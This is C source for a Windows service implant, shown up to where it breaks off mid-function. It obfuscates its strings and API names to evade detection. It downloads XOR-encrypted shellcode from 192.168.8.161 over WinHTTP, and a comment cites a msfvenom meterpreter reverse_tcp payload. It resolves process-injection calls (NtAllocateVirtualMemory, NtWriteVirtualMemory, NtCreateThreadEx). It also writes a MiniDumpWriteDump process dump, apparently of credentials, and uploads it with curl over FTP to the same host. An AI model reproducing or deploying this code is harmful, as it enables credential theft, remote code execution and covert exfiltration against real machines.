#include <windows.h>
#include <signal.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include "native.h"
#include <strsafe.h>
#include <winhttp.h>
#include <wchar.h> 
#include <processsnapshot.h>
#define SVC_ERROR ((DWORD)0xC0020001L)
#define SVCNAME TEXT("win_service32")

#define MAX 600
/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/

NTSTATUS STATUS;
unsigned char magic[5000];
SIZE_T magic_size = sizeof(magic);



SERVICE_STATUS          gSvcStatus; 
SERVICE_STATUS_HANDLE   gSvcStatusHandle; 
HANDLE                  ghSvcStopEvent = NULL;

VOID SvcInstall(void);
VOID WINAPI SvcCtrlHandler( DWORD ); 
VOID WINAPI SvcMain( DWORD, LPTSTR * ); 

VOID ReportSvcStatus( DWORD, DWORD, DWORD );
VOID SvcInit( DWORD, LPTSTR * ); 
VOID SvcReportEvent( LPTSTR );


BOOL CALLBACK MyMiniDumpWriteDumpCallback(
  __in     PVOID CallbackParam,
  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
  __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
        case 16: // IsProcessSnapshotCallback
            CallbackOutput->Status = S_FALSE;
            break;
    }
    return TRUE;
}

int report(){
	char full_string_2[50];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dumpfile.dmp
	char part_string_2_1[] = "\\";
	char part_string_2_2[] = "??";
	char part_string_2_3[] = "\\";
	char part_string_2_4[] = "C";
	char part_string_2_5[] = ":";
	char part_string_2_6[] = "\\";
	char part_string_2_7[] = "Wi";
	char part_string_2_8[] = "nd";
	char part_string_2_9[] = "ow";
	char part_string_2_10[] = "s\\";
	char part_string_2_11[] = "T";
	char part_string_2_12[] = "e";
	char part_string_2_13[] = "mp\\";
	char part_string_2_14[] = "SSS";
	char part_string_2_15[] = "_";
	char part_string_2_16[] = "ce";
	char part_string_2_17[] = "1";
	char part_string_2_18[] = "aaa";
	char part_string_2_19[] = "99ce";
	char part_string_2_20[] = "4bdb";
	char part_string_2_21[] = "0101";
	char part_string_2_22[] = "000000";
	char part_string_2_23[] = "984b2414";
	char part_string_2_24[] = "aa";
	char part_string_2_25[] = "\\";
	char part_string_2_26[] = "d";
	char part_string_2_27[] = "u";
	char part_string_2_28[] = "m";
	char part_string_2_29[] = "p";
	char part_string_2_30[] = "f";
	char part_string_2_31[] = "i";
	char part_string_2_32[] = "l";
	char part_string_2_33[] = "e";
	char part_string_2_34[] = ".";
	char part_string_2_35[] = "d";
	char part_string_2_36[] = "m";
	char part_string_2_37[] = "p";
	strcpy(full_string_2, part_string_2_1);
	strcat(full_string_2, part_string_2_2);
	strcat(full_string_2, part_string_2_3);
	strcat(full_string_2, part_string_2_4);
	strcat(full_string_2, part_string_2_5);
	strcat(full_string_2, part_string_2_6);
	strcat(full_string_2, part_string_2_7);
	strcat(full_string_2, part_string_2_8);
	strcat(full_string_2, part_string_2_9);
	strcat(full_string_2, part_string_2_10);
	strcat(full_string_2, part_string_2_11);
	strcat(full_string_2, part_string_2_12);
	strcat(full_string_2, part_string_2_13);
	strcat(full_string_2, part_string_2_14);
	strcat(full_string_2, part_string_2_15);
	strcat(full_string_2, part_string_2_16);
	strcat(full_string_2, part_string_2_17);
	strcat(full_string_2, part_string_2_18);
	strcat(full_string_2, part_string_2_19);
	strcat(full_string_2, part_string_2_20);
	strcat(full_string_2, part_string_2_21);
	strcat(full_string_2, part_string_2_22);
	strcat(full_string_2, part_string_2_23);
	strcat(full_string_2, part_string_2_24);
	strcat(full_string_2, part_string_2_25);
	strcat(full_string_2, part_string_2_26);
	strcat(full_string_2, part_string_2_27);
	strcat(full_string_2, part_string_2_28);
	strcat(full_string_2, part_string_2_29);
	strcat(full_string_2, part_string_2_30);
	strcat(full_string_2, part_string_2_31);
	strcat(full_string_2, part_string_2_32);
	strcat(full_string_2, part_string_2_33);
	strcat(full_string_2, part_string_2_34);
	strcat(full_string_2, part_string_2_35);
	strcat(full_string_2, part_string_2_36);
	strcat(full_string_2, part_string_2_37);
	
    
	char full_string_1[100];	// innocent.dmp -> remote file name
	char part_string_1_1[] = "i";
	char part_string_1_2[] = "n";
	char part_string_1_3[] = "n";
	char part_string_1_4[] = "o";
	char part_string_1_5[] = "c";
	char part_string_1_6[] = "e";
	char part_string_1_7[] = "n";
	char part_string_1_8[] = "t";
	char part_string_1_9[] = ".";
	char part_string_1_10[] = "d";
	char part_string_1_11[] = "m";
	char part_string_1_12[] = "p";
	strcpy(full_string_1, part_string_1_1);
	strcat(full_string_1, part_string_1_2);
	strcat(full_string_1, part_string_1_3);
	strcat(full_string_1, part_string_1_4);
	strcat(full_string_1, part_string_1_5);
	strcat(full_string_1, part_string_1_6);
	strcat(full_string_1, part_string_1_7);
	strcat(full_string_1, part_string_1_8);
	strcat(full_string_1, part_string_1_9);
	strcat(full_string_1, part_string_1_10);
	strcat(full_string_1, part_string_1_11);
	strcat(full_string_1, part_string_1_12);
  
	char full_string_3[5];	// ftp
	char part_string_3_1[] = "f";
	char part_string_3_2[] = "t";
	char part_string_3_3[] = "p";
	strcpy(full_string_3, part_string_3_1);
	strcat(full_string_3, part_string_3_2);
	strcat(full_string_3, part_string_3_3);
  
  
 	char full_string_4[100];	// 192.168.8.161
	char part_string_4_1[] = "1";
	char part_string_4_2[] = "9";
	char part_string_4_3[] = "2.";
	char part_string_4_4[] = "1";
	char part_string_4_5[] = "6";
	char part_string_4_6[] = "8";
	char part_string_4_7[] = ".";
	char part_string_4_8[] = "8";
	char part_string_4_9[] = ".";
	char part_string_4_10[] = "1";
	char part_string_4_11[] = "6";
	char part_string_4_12[] = "1";
	strcpy(full_string_4, part_string_4_1);
	strcat(full_string_4, part_string_4_2);
	strcat(full_string_4, part_string_4_3);
	strcat(full_string_4, part_string_4_4);
	strcat(full_string_4, part_string_4_5);
	strcat(full_string_4, part_string_4_6);
	strcat(full_string_4, part_string_4_7);
	strcat(full_string_4, part_string_4_8);
	strcat(full_string_4, part_string_4_9);
	strcat(full_string_4, part_string_4_10);
	strcat(full_string_4, part_string_4_11);
	strcat(full_string_4, part_string_4_12);
	
 	char full_string_5[100];	// uploads
	char part_string_5_1[] = "u";
	char part_string_5_2[] = "p";
	char part_string_5_3[] = "l";
	char part_string_5_4[] = "o";
	char part_string_5_5[] = "a";
	char part_string_5_6[] = "d";
	char part_string_5_7[] = "s";
	strcpy(full_string_5, part_string_5_1);
	strcat(full_string_5, part_string_5_2);
	strcat(full_string_5, part_string_5_3);
	strcat(full_string_5, part_string_5_4);
	strcat(full_string_5, part_string_5_5);
	strcat(full_string_5, part_string_5_6);
	strcat(full_string_5, part_string_5_7);

 	char full_string_6[100];	// ftp_user:123
	char part_string_6_1[] = "f";
	char part_string_6_2[] = "t";
	char part_string_6_3[] = "p";
	char part_string_6_4[] = "_";
	char part_string_6_5[] = "u";
	char part_string_6_6[] = "s";
	char part_string_6_7[] = "e";
	char part_string_6_8[] = "r";
	char part_string_6_9[] = ":";
	char part_string_6_10[] = "1";
	char part_string_6_11[] = "2";
	char part_string_6_12[] = "3";
	strcpy(full_string_6, part_string_6_1);
	strcat(full_string_6, part_string_6_2);
	strcat(full_string_6, part_string_6_3);
	strcat(full_string_6, part_string_6_4);
	strcat(full_string_6, part_string_6_5);
	strcat(full_string_6, part_string_6_6);
	strcat(full_string_6, part_string_6_7);
	strcat(full_string_6, part_string_6_8);
	strcat(full_string_6, part_string_6_9);
	strcat(full_string_6, part_string_6_10);
	strcat(full_string_6, part_string_6_11);
	strcat(full_string_6, part_string_6_12);
	
	char full_string_7[100];	// --ftp-ssl-reqd
	char part_string_7_1[] = "--f";
	char part_string_7_2[] = "t";
	char part_string_7_3[] = "p";
	char part_string_7_4[] = "-";
	char part_string_7_5[] = "s";
	char part_string_7_6[] = "s";
	char part_string_7_7[] = "l";
	char part_string_7_8[] = "-";
	char part_string_7_9[] = "r";
	char part_string_7_10[] = "e";
	char part_string_7_11[] = "q";
	char part_string_7_12[] = "d";
	strcpy(full_string_7, part_string_7_1);
	strcat(full_string_7, part_string_7_2);
	strcat(full_string_7, part_string_7_3);
	strcat(full_string_7, part_string_7_4);
	strcat(full_string_7, part_string_7_5);
	strcat(full_string_7, part_string_7_6);
	strcat(full_string_7, part_string_7_7);
	strcat(full_string_7, part_string_7_8);
	strcat(full_string_7, part_string_7_9);
	strcat(full_string_7, part_string_7_10);
	strcat(full_string_7, part_string_7_11);
	strcat(full_string_7, part_string_7_12);
	
	char full_string_8[100];	// curl.exe
	char part_string_8_1[] = "c";
	char part_string_8_2[] = "u";
	char part_string_8_3[] = "r";
	char part_string_8_4[] = "l";
	char part_string_8_5[] = ".";
	char part_string_8_6[] = "e";
	char part_string_8_7[] = "x";
	char part_string_8_8[] = "e";
	strcpy(full_string_8, part_string_8_1);
	strcat(full_string_8, part_string_8_2);
	strcat(full_string_8, part_string_8_3);
	strcat(full_string_8, part_string_8_4);
	strcat(full_string_8, part_string_8_5);
	strcat(full_string_8, part_string_8_6);
	strcat(full_string_8, part_string_8_7);
	strcat(full_string_8, part_string_8_8);
	
	char full_string_9[4];	// -u for --user
	char part_string_9_1[] = "-";
	char part_string_9_2[] = "u";
	strcpy(full_string_9, part_string_9_1);
	strcat(full_string_9, part_string_9_2);
	
	char full_string_10[4];	// -k for --insecure
	char part_string_10_1[] = "-";
	char part_string_10_2[] = "k";
	strcpy(full_string_10, part_string_10_1);
	strcat(full_string_10, part_string_10_2);
	
	char full_string_11[4];	// -s for --silent
	char part_string_11_1[] = "-";
	char part_string_11_2[] = "s";
	strcpy(full_string_11, part_string_11_1);
	strcat(full_string_11, part_string_11_2);
	
	
	
	char curlCommand[512];

	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -k -s
    snprintf(curlCommand, sizeof(curlCommand),
             "%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
             full_string_8,full_string_7,full_string_2,full_string_3,full_string_4,full_string_5,full_string_1,full_string_9,full_string_6,full_string_10,full_string_11);
			 
    int result;
    do {
		result = system(curlCommand);
	} while (result != 0);
	
	return 0;
}

HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p]\n", Module_Name, hModule);
	return hModule;
}

char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

int netops(FARPROC h_11_p_open_func,
			FARPROC h_11_p_conn_func,
			FARPROC h_11_p_open_req_func,
			FARPROC h_11_p_send_func,
			FARPROC h_11_p_recv_func,
			FARPROC h_11_p_query_func,
			FARPROC h_11_p_read_func,
			FARPROC h_11_p_close_func)
{
	
	wchar_t full_string_1[34/2];	// L"shellcode.bin"
	wchar_t part_1_1[] = L"";
	wchar_t part_1_2[] = L"s";
	wchar_t part_1_3[] = L"h";
	wchar_t part_1_4[] = L"e";
	wchar_t part_1_5[] = L"ll";
	wchar_t part_1_6[] = L"c";
	wchar_t part_1_7[] = L"o";
	wchar_t part_1_8[] = L"d";
	wchar_t part_1_9[] = L"e";
	wchar_t part_1_10[] = L".";
	wchar_t part_1_11[] = L"b";
	wchar_t part_1_12[] = L"in";
	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
	wcscpy(full_string_1, part_1_1);
	wcscat(full_string_1, part_1_2);
	wcscat(full_string_1, part_1_3);
	wcscat(full_string_1, part_1_4);
	wcscat(full_string_1, part_1_5);
	wcscat(full_string_1, part_1_6);
	wcscat(full_string_1, part_1_7);
	wcscat(full_string_1, part_1_8);
	wcscat(full_string_1, part_1_9);
	wcscat(full_string_1, part_1_10);
	wcscat(full_string_1, part_1_11);
	wcscat(full_string_1, part_1_12);
	//printf("size of /shellcode.bin after concat-> %d\n",sizeof(full_string_1));
	//wprintf(L"%s\n",full_string_1);
	
	
	HINTERNET hSession = h_11_p_open_func(NULL,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
	if (!hSession ){
		//printf("[x] WinHttpOpen FAILED %lu\n",GetLastError());
		return 1;
	}
	//printf("[+] WinHttpOpen DONE\n");
	

	
	wchar_t full_string_2[30/2];	// L"192.168.8.161"
	wchar_t part_2_1[] = L"1";
	wchar_t part_2_2[] = L"9";
	wchar_t part_2_3[] = L"2";
	wchar_t part_2_4[] = L".1";
	wchar_t part_2_5[] = L"6";
	wchar_t part_2_6[] = L"8";
	wchar_t part_2_7[] = L".8";
	wchar_t part_2_8[] = L".";
	wchar_t part_2_9[] = L"1";
	wchar_t part_2_10[] = L"6";
	wchar_t part_2_11[] = L"1";
	//printf("size of 192.168.8.161 -> %d\n",sizeof(L"192.168.8.161"));
	wcscpy(full_string_2, part_2_1);
	wcscat(full_string_2, part_2_2);
	wcscat(full_string_2, part_2_3);
	wcscat(full_string_2, part_2_4);
	wcscat(full_string_2, part_2_5);
	wcscat(full_string_2, part_2_6);
	wcscat(full_string_2, part_2_7);
	wcscat(full_string_2, part_2_8);
	wcscat(full_string_2, part_2_9);
	wcscat(full_string_2, part_2_10);
	wcscat(full_string_2, part_2_11);
	//printf("size of 192.168.8.161 after concat-> %d\n",sizeof(full_string_2));
	//wprintf(L"%s\n",full_string_2);
	
	
	
	
	HINTERNET hConnect = h_11_p_conn_func(hSession,full_string_2,8000,0);
	if ( !hConnect ){
		//printf("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
		return 1;
		
	}
	//printf("[+] WinHttpConnect DONE\n");
	
	wchar_t full_string_3[8];	// L"GET"
	wchar_t part_3_1[] = L"G";
	wchar_t part_3_2[] = L"E";
	wchar_t part_3_3[] = L"T";
	//printf("size of GET -> %d\n",sizeof(L"GET"));
	wcscpy(full_string_3, part_3_1);
	wcscat(full_string_3, part_3_2);
	wcscat(full_string_3, part_3_3);
	//printf("size of GET after concat-> %d\n",sizeof(full_string_3));
	//wprintf(L"%s\n",full_string_3);
	
	HINTERNET hRequest = h_11_p_open_req_func(hConnect,full_string_3,full_string_1,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
	if ( !hRequest ){
		//printf("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
		return 1;
	}
	
	//printf("[+] WinHttpOpenRequest DONE\n");
	
	
	BOOL bValue;
	do{
		
		bValue = h_11_p_send_func(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
		
	} while (bValue == FALSE);
	//printf("[+] WinHttpSendRequest DONE\n");

	
	
	if ( h_11_p_recv_func(hRequest,NULL) == FALSE ){
		//printf("[x] WinHttpReceiveResponse FAILED %lu\n",GetLastError());
		return 1;
	}
	//printf("[+] WinHttpReceiveResponse DONE\n");

	DWORD dwSize = 0;
    if (!h_11_p_query_func(hRequest, &dwSize)) {
        //printf("[x] WinHttpQueryDataAvailable FAILED %lu\n", GetLastError());
        return 1;
    }
	//printf("[+] WinHttpQueryDataAvailable DONE\n");
	ZeroMemory(magic, sizeof(magic));
	DWORD dwDownloaded = 0;
	//printf("[+] BEFORE WinHttpReadData\n");
    if (!h_11_p_read_func(hRequest, (LPVOID)magic, dwSize, &dwDownloaded)) {
        //printf("[x] WinHttpReadData FAILED %lu\n", GetLastError());
        return 1;
    }
	//printf("[+] WinHttpReadData DONE\n");
	
	
	//printf("[+] File content: \n%s\n", magic);
	/*
	for (int i = 0; i < sizeof(magic); i++) {
	printf("\\x%02x ", magic[i]);
	}
	*/
	//printf("\n");
	//printf("[+] File size: %d\n", sizeof(magic));
	
	
	
    h_11_p_close_func(hRequest);
    h_11_p_close_func(hConnect);
    h_11_p_close_func(hSession);
	return 0;
}


void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
    //printf("[+] DECRYPTING with '%c' key\n", key);
    for (int i = 0; i < magic_size; i++) {
        //printf("\\x%02x", magic[i] ^ key);
        magic[i] = magic[i] ^ key;
    }
    //printf("\n");
	return;
}


int main_meat(){
	
	WSADATA wsaData;
	SOCKET client_socket;
	struct sockaddr_in server_addr;
	int _p__0rt=1234; //PUT SERVER PORT HERE
	char recv_buffer[MAX];
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
	int connect;
	char key1= 'P';
	char key2= 'L';
	char key3= 'S';
	char key4= 'a';
	char key5= '5';
	
	// --- START GET OFFSETS --- //
	//char offset[]="kernel	32.dll";
	//obfuscate(ALL_ALPHANUM,offset);
	//return 0;
	// --- END GET OFFSETS --- //
	
	
	int wsa_startup_offset[] = {48,44,26,44,19,0,17,19,20,15};
	int wsa_socket_offset[] = {48,44,26,44,14,2,10,4,19,26};
	int wsa_connect_offset[] = {48,44,26,28,14,13,13,4,2,19} ;
	int h_tons_offset[] = {7,19,14,13,18};
	int inet_addr_offset[] = {8,13,4,19,63,0,3,3,17};
	int wsa_cleanup_offset[] = {48,44,26,28,11,4,0,13,20,15};
	int wait_for_single_object_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
	int create_process_A_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26,};
	int exe_c_C_M_d_offset[] = {2,12,3,62,4,23,4};	//cmd.exe
	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,60,62,53,58,53}; 	//192.168.8.161
	int dll_ws2__32_offset[] = {22,18,54,63,55,54,62,3,11,11};
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int dll_n__t_offset[] = {39,45,29,37,37};
	int dll_a_DV_offset[] = {0,3,21,0,15,8,55,54,62,3,11,11};
	int dll_H_11_P_offset[] = {22,8,13,7,19,19,15,62,3,11,11};
	int dll_d_b_g_offset[] = {3,1,6,7,4,11,15,62,3,11,11};	
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};						//LoadLibraryA
	int close_sock_offset[] = {2,11,14,18,4,18,14,2,10,4,19};
	int recv_offset[] = {17,4,2,21};
	int cr_file_offset[] = {28,17,4,0,19,4,31,8,11,4,26};							//CreateFileA
	int h_11_p_open_offset[] = {48,8,13,33,19,19,15,40,15,4,13};					//WinHttpOpen
	int h_11_p_conn_offset[] = {48,8,13,33,19,19,15,28,14,13,13,4,2,19};				//WinHttpConnect
	int h_11_p_open_req_offset[] = {48,8,13,33,19,19,15,40,15,4,13,43,4,16,20,4,18,19};	//WinHttpOpenRequest
	int h_11_p_send_offset[] = {48,8,13,33,19,19,15,44,4,13,3,43,4,16,20,4,18,19};	//WinHttpSendRequest
	int h_11_p_recv_offset[] = {48,8,13,33,19,19,15,43,4,2,4,8,21,4,43,4,18,15,14,13,18,4}; //WinHttpReceiveResponse
	int h_11_p_query_offset[] = {48,8,13,33,19,19,15,42,20,4,17,24,29,0,19,0,26,21,0,8,11,0,1,11,4}; //WinHttpQueryDataAvailable
	int h_11_p_read_offset[] = {48,8,13,33,19,19,15,43,4,0,3,29,0,19,0}; //WinHttpReadData
	int h_11_p_close_offset[] = {48,8,13,33,19,19,15,28,11,14,18,4,33,0,13,3,11,4}; //WinHttpCloseHandle
	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};	//CreateToolhelp32Snapshot 
	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};					//Process32Next
	int wr_dmp_offset[] = {38,8,13,8,29,20,12,15,48,17,8,19,4,29,20,12,15}; //MiniDumpWriteDump
	int pss_capture_offset[] = {41,18,18,28,0,15,19,20,17,4,44,13,0,15,18,7,14,19}; //PssCaptureSnapshot 
	
	

	wchar_t full_string_3[10];	// L"Kernel32"
	wchar_t part_3_1[] = L"K";
	wchar_t part_3_2[] = L"e";
	wchar_t part_3_3[] = L"r";
	wchar_t part_3_4[] = L"n";
	wchar_t part_3_5[] = L"e";
	wchar_t part_3_6[] = L"l";
	wchar_t part_3_7[] = L"3";
	wchar_t part_3_8[] = L"2";
	//printf("size of Kernel32 -> %d\n",sizeof(L"Kernel32"));
	wcscpy(full_string_3, part_3_1);
	wcscat(full_string_3, part_3_2);
	wcscat(full_string_3, part_3_3);
	wcscat(full_string_3, part_3_4);
	wcscat(full_string_3, part_3_5);
	wcscat(full_string_3, part_3_6);
	wcscat(full_string_3, part_3_7);
	wcscat(full_string_3, part_3_8);
	//printf("size of Kernel32 after concat-> %d\n",sizeof(full_string_3));
	//wprintf(L"%s\n",full_string_3);
	
	HMODULE hK32 = Get_Module(full_string_3);
	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//
	
	// --- START LOAD WS2_32 DLL --- //
	HMODULE hDLL_ws2__32 = L_0_D_LIB(GetOriginal(dll_ws2__32_offset,ALL_ALPHANUM,sizeof(dll_ws2__32_offset)));
	if (hDLL_ws2__32 == NULL){
		//printf("[x] COULD NOT LOAD ws2_32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD WS2_32 DLL --- //
	
	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START LOAD NTDLL DLL --- //
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD NTDLL DLL ---//
	
	// --- START LOAD winhttp DLL --- //
	HMODULE hdll_H_11_P = L_0_D_LIB(GetOriginal(dll_H_11_P_offset,ALL_ALPHANUM,sizeof(dll_H_11_P_offset)));
	if (hdll_H_11_P == NULL){
		//printf("[x] COULD NOT LOAD winhttp.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_H_11_P_offset,ALL_ALPHANUM,sizeof(dll_H_11_P_offset)),hdll_H_11_P);
	// --- END LOAD winhttp DLL ---//
	
	// --- START LOAD Dbghelp DLL --- //
	HMODULE hdll_d_b_g = L_0_D_LIB(GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_d_b_g_offset)));
	if (hdll_d_b_g == NULL){
		//printf("[x] COULD NOT LOAD dbghelp.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_d_b_g_offset)),hdll_H_11_P);
	// --- END LOAD Dbghelp DLL ---//
	// --- START LOAD Advapi32 DLL --- //
	HMODULE hdll_a_DV = L_0_D_LIB(GetOriginal(dll_a_DV_offset,ALL_ALPHANUM,sizeof(dll_a_DV_offset)));
	if (hdll_a_DV == NULL){
		//printf("[x] COULD NOT LOAD advapi32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_a_DV_offset,ALL_ALPHANUM,sizeof(dll_a_DV_offset)),hdll_a_DV);
	// --- END LOAD Advapi32 DLL ---//
	
	
	char full_func_1[8];	//NtClose
	char part_func_1_1[] = "N";
	char part_func_1_2[] = "t";
	char part_func_1_3[] = "C";
	char part_func_1_4[] = "lo";
	char part_func_1_5[] = "s";
	char part_func_1_6[] = "e";
	strcpy(full_func_1, part_func_1_1);
	strcat(full_func_1, part_func_1_2);
	strcat(full_func_1, part_func_1_3);
	strcat(full_func_1, part_func_1_4);
	strcat(full_func_1, part_func_1_5);
	strcat(full_func_1, part_func_1_6);
	//printf("%s\n",full_func_1);
	
	char full_func_2[14];	//NtOpenProcess
	char part_func_2_1[] = "N";
	char part_func_2_2[] = "t";
	char part_func_2_3[] = "O";
	char part_func_2_4[] = "p";
	char part_func_2_5[] = "e";
	char part_func_2_6[] = "n";
	char part_func_2_7[] = "P";
	char part_func_2_8[] = "r";
	char part_func_2_9[] = "o";
	char part_func_2_10[] = "c";
	char part_func_2_11[] = "e";
	char part_func_2_12[] = "s";
	char part_func_2_13[] = "s";
	strcpy(full_func_2, part_func_2_1);
	strcat(full_func_2, part_func_2_2);
	strcat(full_func_2, part_func_2_3);
	strcat(full_func_2, part_func_2_4);
	strcat(full_func_2, part_func_2_5);
	strcat(full_func_2, part_func_2_6);
	strcat(full_func_2, part_func_2_7);
	strcat(full_func_2, part_func_2_8);
	strcat(full_func_2, part_func_2_9);
	strcat(full_func_2, part_func_2_10);
	strcat(full_func_2, part_func_2_11);
	strcat(full_func_2, part_func_2_12);
	strcat(full_func_2, part_func_2_13);
	//printf("%s\n",full_func_2);
	
	char full_func_3[17];	//NtCreateThreadEx
	char part_func_3_1[] = "N";
	char part_func_3_2[] = "t";
	char part_func_3_3[] = "C";
	char part_func_3_4[] = "r";
	char part_func_3_5[] = "e";
	char part_func_3_6[] = "a";
	char part_func_3_7[] = "t";
	char part_func_3_8[] = "e";
	char part_func_3_9[] = "T";
	char part_func_3_10[] = "h";
	char part_func_3_11[] = "r";
	char part_func_3_12[] = "e";
	char part_func_3_13[] = "a";
	char part_func_3_14[] = "d";
	char part_func_3_15[] = "E";
	char part_func_3_16[] = "x";
	strcpy(full_func_3, part_func_3_1);
	strcat(full_func_3, part_func_3_2);
	strcat(full_func_3, part_func_3_3);
	strcat(full_func_3, part_func_3_4);
	strcat(full_func_3, part_func_3_5);
	strcat(full_func_3, part_func_3_6);
	strcat(full_func_3, part_func_3_7);
	strcat(full_func_3, part_func_3_8);
	strcat(full_func_3, part_func_3_9);
	strcat(full_func_3, part_func_3_10);
	strcat(full_func_3, part_func_3_11);
	strcat(full_func_3, part_func_3_12);
	strcat(full_func_3, part_func_3_13);
	strcat(full_func_3, part_func_3_14);
	strcat(full_func_3, part_func_3_15);
	strcat(full_func_3, part_func_3_16);
	//printf("%s\n",full_func_3);
	
	char full_func_4[24];	//NtAllocateVirtualMemory
	char part_func_4_1[] = "N";
	char part_func_4_2[] = "t";
	char part_func_4_3[] = "A";
	char part_func_4_4[] = "l";
	char part_func_4_5[] = "l";
	char part_func_4_6[] = "o";
	char part_func_4_7[] = "c";
	char part_func_4_8[] = "a";
	char part_func_4_9[] = "t";
	char part_func_4_10[] = "e";
	char part_func_4_11[] = "V";
	char part_func_4_12[] = "i";
	char part_func_4_13[] = "r";
	char part_func_4_14[] = "t";
	char part_func_4_15[] = "u";
	char part_func_4_16[] = "a";
	char part_func_4_17[] = "l";
	char part_func_4_18[] = "M";
	char part_func_4_19[] = "e";
	char part_func_4_20[] = "m";
	char part_func_4_21[] = "o";
	char part_func_4_22[] = "r";
	char part_func_4_23[] = "y";
	strcpy(full_func_4, part_func_4_1);
	strcat(full_func_4, part_func_4_2);
	strcat(full_func_4, part_func_4_3);
	strcat(full_func_4, part_func_4_4);
	strcat(full_func_4, part_func_4_5);
	strcat(full_func_4, part_func_4_6);
	strcat(full_func_4, part_func_4_7);
	strcat(full_func_4, part_func_4_8);
	strcat(full_func_4, part_func_4_9);
	strcat(full_func_4, part_func_4_10);
	strcat(full_func_4, part_func_4_11);
	strcat(full_func_4, part_func_4_12);
	strcat(full_func_4, part_func_4_13);
	strcat(full_func_4, part_func_4_14);
	strcat(full_func_4, part_func_4_15);
	strcat(full_func_4, part_func_4_16);
	strcat(full_func_4, part_func_4_17);
	strcat(full_func_4, part_func_4_18);
	strcat(full_func_4, part_func_4_19);
	strcat(full_func_4, part_func_4_20);
	strcat(full_func_4, part_func_4_21);
	strcat(full_func_4, part_func_4_22);
	strcat(full_func_4, part_func_4_23);
	//printf("%s\n",full_func_4);
	
	
	char full_func_5[21];	//NtWriteVirtualMemory
	char part_func_5_1[] = "N";
	char part_func_5_2[] = "t";
	char part_func_5_3[] = "W";
	char part_func_5_4[] = "r";
	char part_func_5_5[] = "i";
	char part_func_5_6[] = "t";
	char part_func_5_7[] = "e";
	char part_func_5_8[] = "V";
	char part_func_5_9[] = "i";
	char part_func_5_10[] = "r";
	char part_func_5_11[] = "t";
	char part_func_5_12[] = "u";
	char part_func_5_13[] = "a";
	char part_func_5_14[] = "l";
	char part_func_5_15[] = "M";
	char part_func_5_16[] = "e";
	char part_func_5_17[] = "m";
